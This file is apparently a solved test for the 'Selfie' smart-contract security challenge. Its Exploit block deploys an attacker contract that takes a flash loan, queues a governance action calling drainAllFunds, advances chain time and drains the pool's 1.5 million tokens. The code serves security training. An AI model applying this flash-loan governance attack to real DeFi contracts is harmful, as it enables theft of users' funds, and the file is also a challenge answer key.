const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address,
            this.governance.address    
        );

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
    });

    it('Exploit', async function () {
        //Generate Data
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool');
        const ISelfiePoolFactory =  SelfiePoolFactory.interface
        const data = ISelfiePoolFactory.encodeFunctionData("drainAllFunds", [
         attacker.address
        ]);

        // await this.governance.queueAction(this.governance.address, data, 0);

        //Deploy SelfieAttacker
        const SelfieAttacker = await ethers.getContractFactory('SelfieAttacker', attacker);
        this.selfieAttacker = await SelfieAttacker.deploy(this.governance.address, this.pool.address, data);

        //call attack
        await this.selfieAttacker.connect(attacker).attack(TOKENS_IN_POOL, this.token.address);

        this.actionId = await this.selfieAttacker.actionId();

        //Move time forward 
        // Advance time 2 days so we can execute 
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days

        //Call function in simple governance
        await this.governance.connect(attacker).executeAction(this.actionId);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});
